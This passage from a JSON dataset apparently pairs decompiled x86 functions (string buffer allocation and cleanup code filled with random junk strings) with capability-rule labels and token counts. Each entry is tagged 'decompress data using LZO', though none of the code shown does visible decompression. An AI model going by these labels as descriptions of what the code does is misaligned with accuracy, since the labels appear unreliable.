        "decompiled_code": "\nvoid __fastcall fcn.004052a9(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t arg_8h;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e250;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (7 < param_1[5]) {\n        arg_8h = *param_1;\n        if ((0xfff < param_1[5] * 2 + 2U) && (iVar2 = arg_8h + -4,  arg_8h = *(arg_8h + -4),  0x1f < iVar2 - arg_8h)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(arg_8h);\n    }\n    param_1[4] = 0;\n    param_1[5] = 7;\n    *param_1 = 0;\n    *in_FS_OFFSET = piStack28;\n    return;\n}\n",
        "token_count": 342
    },
    "004052c7": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004052c7(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    uint auStack168 [2];\n    char *pcStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack24 = 0x44c630;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    uStack20 = 7;\n    pcStack160 = \"snmqrzgcxdffleabjdofbzyqfqfyyzdgzpnjlkikywtyfwbirnhavhxjrcenmt\";\n    auStack168[0] = 0x3e;\n    fcn.00402f72();\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x2d, iStack84, \"frhwtvcmeeusstlblgdqpcvwplvbaoyfehjeegqscdorb\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x5e, iStack60, \n                 \"kdovqxsrphvkiyxiwfcllkliyjrxqbxukmyjqevvfobqtawjvxokeycaxxeymtzcggvafrrlxjsihhqcfnkeokmojzlwcu\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x3e, iStack132, \"snmqrzgcxdffleabjdofbzyqfqfyyzdgzpnjlkikywtyfwbirnhavhxjrcenmt\");\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 0xb;\n    fcn.00402f72(0x3e, uStack36, \"snmqrzgcxdffleabjdofbzyqfqfyyzdgzpnjlkikywtyfwbirnhavhxjrcenmt\");\n    if (uStack112 < 0x10) {\ncode_r0x004325be:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x00432759;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x00432765;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x00432771;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack136) {\n            iVar2 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar2 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar2))\n            goto code_r0x0043277d;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000001c) {\n            iVar2 = param_2;\n            if ((0xfff < in_stack_0000001c + 1) && (iVar2 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar2))\n            goto code_r0x00432789;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000034) {\n            iVar2 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (iVar2 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar2)) goto code_r0x00432795;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0;\n    }\n    iVar2 = iStack132;\n    if ((uStack112 + 1 < 0x1000) || (iVar2 = *(iStack132 + -4),  (iStack132 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x004325be;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00432759:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00432765:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00432771:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0043277d:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00432789:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00432795:\n    uStack20 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1630
    },
    "00405407": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00405407(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x414900;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x25);\n    if (uStack40 < 0x10) {\ncode_r0x0040f7c9:\n        if (0xf < in_stack_00000018) {\n            iVar1 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar1 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar1))\n            goto code_r0x0040f868;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000034) {\n            iVar1 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (iVar1 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar1)) goto code_r0x0040f874;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x4ea1e8;\n    }\n    iVar1 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar1 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0040f7c9;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0040f868:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0040f874:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 680
    },
    "0040543e": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.0040543e(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x414a60;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    pcStack112 = \"ribqlkesvpsuwgxra\";\n    auStack120[0] = 0x11;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x11, iStack84, \"ribqlkesvpsuwgxra\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x11, uStack36, \"ribqlkesvpsuwgxra\");\n    if (uStack64 < 0x10) {\ncode_r0x00413143:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x004131ee;\n            fcn.00401a32(iVar2);\n        }\n        *param_1 = 0;\n        param_1[5] = 0xf;\n        param_1[4] = 0;\n        *param_1 = 0;\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x004131fa;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar2 = *(iStack84 + -4),  (iStack84 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00413143;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004131ee:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004131fa:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 849
    },
    "0040544d": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.0040544d(uint32_t param_1)\n\n{\n    uchar **ppuVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t unaff_ESI;\n    uint32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    float10 fVar4;\n    uint32_t in_stack_00000018;\n    uint in_stack_00000028;\n    uint32_t in_stack_0000002c;\n    uint *in_stack_00000030;\n    uint32_t in_stack_00000044;\n    uint32_t in_stack_ffffff00;\n    uint32_t in_stack_ffffff18;\n    uint uStack200;\n    uchar uStack196;\n    char *pcStack192;\n    int32_t iStack188;\n    uint uStack172;\n    uint32_t uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    ushort uStack152;\n    uchar uStack150;\n    uint uStack148;\n    uint uStack144;\n    int32_t iStack140;\n    uint uStack124;\n    uint32_t uStack120;\n    uint32_t uStack116;\n    uint uStack100;\n    uint32_t uStack96;\n    uchar uStack92;\n    uint *puStack88;\n    int32_t *piStack84;\n    uint uStack80;\n    uint uStack76;\n    uint *puStack72;\n    uint32_t uStack68;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack72 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c130;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = unaff_EDI;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_0000002c < 0x10) {\ncode_r0x00422884:\n        ppuStack32 = ppuVar1;\n        in_stack_00000028 = 0;\n        in_stack_0000002c = 0xf;\n        in_stack_00000018 = in_stack_00000018 & 0xffffff00;\n        if (in_stack_00000044 < 0x10) {\ncode_r0x004228ca:\n            *in_FS_OFFSET = piStack28;\n            return *0x541fd4;\n        }\n        puStack72 = in_stack_00000030;\n        if ((in_stack_00000044 + 1 < 0x1000) ||\n           (puStack72 = in_stack_00000030[-1],  in_stack_00000030 + (-4 - puStack72) < 0x20)) {\n            fcn.00401a32(puStack72);\n            goto code_r0x004228ca;\n        }\n    }\n    else {\n        uStack68 = in_stack_00000018;\n        if ((in_stack_0000002c + 1 < 0x1000) ||\n           (uStack68 = *(in_stack_00000018 - 4),  unaff_EDI = uStack68,  (in_stack_00000018 - 4) - uStack68 < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(uStack68);\n            uStack68 = unaff_EDI;\n            ppuVar1 = ppuStack32;\n            goto code_r0x00422884;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\n    }\n    uStack20 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    puStack88 = &uStack200;\n    uStack80 = 0x44c140;\n    piStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack84;\n    uStack172 = 0;\n    uStack168 = 0xf;\n    iStack188 = 0;\n    uStack76 = 8;\n    uStack196 = uStack164;\n    pcStack192 = \"pbtscjdwbiqzisnguinvtssdvvjcgcxdxqfqwthnnkcjedmqstziivbilfecwrvlwzxilcpwyuh\";\n    uStack200 = 0x4b;\n    fcn.00402f72();\n    uStack144 = 0xf;\n    uStack148 = 0xe;\n    uStack164 = 0x656a6668;\n    uStack160 = 0x71786a6d;\n    uStack156 = 0x68687478;\n    uStack152 = 0x676e;\n    uStack150 = 0;\n    uStack124 = 0;\n    uStack120 = 0xf;\n    iStack140 = 0;\n    uStack76 = 9;\n    fcn.00402f72(0x4b, uStack116, \"pbtscjdwbiqzisnguinvtssdvvjcgcxdxqfqwthnnkcjedmqstziivbilfecwrvlwzxilcpwyuh\");\n    uStack100 = 0;\n    uStack96 = 0xf;\n    uStack116 = 0;\n    uStack76 = 0xc;\n    fcn.00402f72(0x4b, uStack92, \"pbtscjdwbiqzisnguinvtssdvvjcgcxdxqfqwthnnkcjedmqstziivbilfecwrvlwzxilcpwyuh\");\n    if (uStack96 < 0x10) {\ncode_r0x00422a7a:\n        if (0xf < uStack120) {\n            in_stack_ffffff18 = uStack120 + 1;\n            iVar3 = iStack140;\n            if (0xfff < in_stack_ffffff18) {\n                iVar3 = *(iStack140 + -4);\n                if (0x1f < (iStack140 + -4) - iVar3) goto code_r0x00422d37;\n                in_stack_ffffff18 = uStack120 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack124 = 0;\n        uStack120 = 0xf;\n        iStack140 = 0;\n        uStack76 = 9;\n        fcn.00402f72(0x4b, in_stack_ffffff18 & 0xffffff00 | uStack116 & 0xff, \n                     \"pbtscjdwbiqzisnguinvtssdvvjcgcxdxqfqwthnnkcjedmqstziivbilfecwrvlwzxilcpwyuh\");\n        uStack100 = 0;\n        uStack96 = 0xf;\n        uStack116 = 0;\n        uStack76 = 0xb;\n        fcn.00402f72(0x4b, uStack92, \"pbtscjdwbiqzisnguinvtssdvvjcgcxdxqfqwthnnkcjedmqstziivbilfecwrvlwzxilcpwyuh\");\n        if (0xf < uStack96) {\n            in_stack_ffffff00 = uStack96 + 1;\n            uVar2 = uStack116;\n            if (0xfff < in_stack_ffffff00) {\n                uVar2 = *(uStack116 - 4);\n                if (0x1f < (uStack116 - 4) - uVar2) goto code_r0x00422d43;\n                in_stack_ffffff00 = uStack96 + 0x24;\n            }\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack120) {\n            in_stack_ffffff00 = uStack120 + 1;\n            iVar3 = iStack140;\n            if (0xfff < in_stack_ffffff00) {\n                iVar3 = *(iStack140 + -4);\n                if (0x1f < (iStack140 + -4) - iVar3) goto code_r0x00422d4f;\n                in_stack_ffffff00 = uStack120 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack124 = 0;\n        uStack120 = 0xf;\n        iStack140 = 0;\n        uStack76 = 9;\n        fcn.00402f72(0x4b, in_stack_ffffff00 & 0xffffff00 | uStack116 & 0xff, \n                     \"pbtscjdwbiqzisnguinvtssdvvjcgcxdxqfqwthnnkcjedmqstziivbilfecwrvlwzxilcpwyuh\");\n        uStack100 = 0;\n        uStack96 = 0xf;\n        uStack116 = 0;\n        uStack76 = 10;\n        fVar4 = fcn.00402f72(0x4b, uStack92, \n                             \"pbtscjdwbiqzisnguinvtssdvvjcgcxdxqfqwthnnkcjedmqstziivbilfecwrvlwzxilcpwyuh\");\n        if (0xf < uStack96) {\n            uVar2 = uStack116;\n            if ((0xfff < uStack96 + 1) && (uVar2 = *(uStack116 - 4),  0x1f < (uStack116 - 4) - uVar2))\n            goto code_r0x00422d5b;\n            fVar4 = fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack120) {\n            iVar3 = iStack140;\n            if ((0xfff < uStack120 + 1) && (iVar3 = *(iStack140 + -4),  0x1f < (iStack140 + -4) - iVar3))\n            goto code_r0x00422d67;\n            fVar4 = fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack168) {\n            iVar3 = iStack188;\n            if ((0xfff < uStack168 + 1) && (iVar3 = *(iStack188 + -4),  0x1f < (iStack188 + -4) - iVar3))\n            goto code_r0x00422d73;\n            fVar4 = fcn.00401a32(iVar3);\n        }\n        if (0xf < param_1) {\n            iVar3 = unaff_ESI;\n            if ((0xfff < param_1 + 1) && (iVar3 = *(unaff_ESI + -4),  0x1f < (unaff_ESI + -4) - iVar3))\n            goto code_r0x00422d7f;\n            fVar4 = fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack84;\n        return fVar4;\n    }\n    in_stack_ffffff18 = uStack96 + 1;\n    uVar2 = uStack116;\n    if (in_stack_ffffff18 < 0x1000) {\ncode_r0x00422a6e:\n        fcn.00401a32(uVar2);\n        goto code_r0x00422a7a;\n    }\n    uVar2 = *(uStack116 - 4);\n    if ((uStack116 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff18 = uStack96 + 0x24;\n        goto code_r0x00422a6e;\n    }\n    uStack76 = 0;\n    fcn.004047f5();\ncode_r0x00422d37:\n    uStack76 = 1;\n    fcn.004047f5();\ncode_r0x00422d43:\n    uStack76 = 2;\n    fcn.004047f5();\ncode_r0x00422d4f:\n    uStack76 = 3;\n    fcn.004047f5();\ncode_r0x00422d5b:\n    uStack76 = 4;\n    fcn.004047f5();\ncode_r0x00422d67:\n    uStack76 = 5;\n    fcn.004047f5();\ncode_r0x00422d73:\n    uStack76 = 6;\n    fcn.004047f5();\ncode_r0x00422d7f:\n    uStack76 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fVar4 = fcn.00403a76();\n    return fVar4;\n}\n",
        "token_count": 2930
    },
    "0040545c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.0040545c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_0000003c;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c3b0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x43);\n    if (0xf < uStack40) {\n        iVar2 = aiStack60[0];\n        if ((0xfff < uStack40 + 1) && (iVar2 = *(aiStack60[0] + -4),  0x1f < (aiStack60[0] + -4) - iVar2)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x0042a7af;\n        }\n        fcn.00401a32(iVar2);\n    }\n    if (0xf < in_stack_0000003c) {\n        iVar2 = in_stack_00000028;\n        if ((0xfff < in_stack_0000003c + 1) &&\n           (iVar2 = *(in_stack_00000028 + -4),  0x1f < (in_stack_00000028 + -4) - iVar2)) {\ncode_r0x0042a7af:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            uVar1 = fcn.00403a76();\n            return uVar1;\n        }\n        fcn.00401a32(iVar2);\n    }\n    *in_FS_OFFSET = piStack28;\n    return 0x12bab;\n}\n",
        "token_count": 505
    },
    "00405547": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t * __thiscall fcn.00405547(uint32_t *param_1, uint32_t param_2, uint param_3, uint param_4, int32_t param_5)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t **in_FS_OFFSET;\n    uint32_t uStack40;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e3c0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uVar7 = param_1[4];\n    uStack40 = 0x7fffffff;\n    if (0x7fffffff - uVar7 < param_2) {\n        fcn.004038aa();\n    }\n    else {\n        param_2 = param_2 + uVar7;\n        uVar1 = param_1[5];\n        uVar6 = param_2 | 0xf;\n        uVar3 = 0x80000000;\n        if ((uVar6 < 0) || ((uVar1 >> 1 ^ 0x7fffffff) < uVar1)) {\ncode_r0x004195d7:\n            iVar4 = fcn.004024b9(uVar3 + 0x23, param_2);\n            uVar3 = iVar4 + 0x23U & 0xffffffe0;\n            *(uVar3 - 4) = iVar4;\n        }\n        else {\n            uStack40 = (uVar1 >> 1) + uVar1;\n            if (uStack40 <= uVar6) {\n                uStack40 = uVar6;\n            }\n            uVar3 = uStack40 + 1;\n            if (0xfff < uVar3) {\n                if (0xffffffdc < uVar3) goto code_r0x004196c9;\n                goto code_r0x004195d7;\n            }\n            if (uVar3 == 0) {\n                uVar3 = 0;\n                uStack40 = 0xffffffff;\n            }\n            else {\n                uVar3 = fcn.004024b9(uVar3, param_2);\n            }\n        }\n        param_1[4] = param_2;\n        param_1[5] = uStack40;\n        if (uVar1 < 0x10) {\n            fcn.0040576d(uVar3, param_1, uVar7);\n            fcn.0040576d(uVar3 + uVar7, param_4, param_5);\n            *(uVar3 + uVar7 + param_5) = 0;\ncode_r0x00419681:\n            *param_1 = uVar3;\n            *in_FS_OFFSET = piStack28;\n            return param_1;\n        }\n        uVar6 = *param_1;\n        fcn.0040576d(uVar3, uVar6, uVar7);\n        fcn.0040576d(uVar3 + uVar7, param_4, param_5);\n        *(uVar3 + uVar7 + param_5) = 0;\n        uVar7 = uVar6;\n        if ((uVar1 + 1 < 0x1000) || (uVar7 = *(uVar6 - 4),  (uVar6 - 4) - uVar7 < 0x20)) {\n            fcn.00401a32(uVar7);\n            goto code_r0x00419681;\n        }\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004196c9:\n    fcn.004050bf();\n    fcn.004052d1();\n    pcVar2 = swi(3);\n    puVar5 = (*pcVar2)();\n    return puVar5;\n}\n",
        "token_count": 905
    },
    "0040557e": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040557e(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t in_stack_00000038;\n    uint32_t in_stack_0000004c;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack24 = 0x44c3a0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 6;\n    pcStack136 = \"pixupuraitkgmxihuutlyntupgpjkk\";\n    auStack144[0] = 0x1e;\n    fcn.00402f72();\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x15, iStack60, \"qedicudehjzvjvytmicua\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x1e, iStack108, \"pixupuraitkgmxihuutlyntupgpjkk\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x1e, uStack36, \"pixupuraitkgmxihuutlyntupgpjkk\");\n    if (uStack88 < 0x10) {\ncode_r0x0042a42e:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0042a58c;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x0042a598;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x0042a5a4;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000001c) {\n            iVar2 = param_2;\n            if ((0xfff < in_stack_0000001c + 1) && (iVar2 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar2))\n            goto code_r0x0042a5b0;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000004c) {\n            iVar2 = in_stack_00000038;\n            if ((0xfff < in_stack_0000004c + 1) &&\n               (iVar2 = *(in_stack_00000038 + -4),  0x1f < (in_stack_00000038 + -4) - iVar2)) goto code_r0x0042a5bc;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0xc5f1;\n    }\n    iVar2 = iStack108;\n    if ((uStack88 + 1 < 0x1000) || (iVar2 = *(iStack108 + -4),  (iStack108 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0042a42e;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042a58c:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042a598:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0042a5a4:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0042a5b0:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0042a5bc:\n    uStack20 = 5;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1338
    },
    "0040560f": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
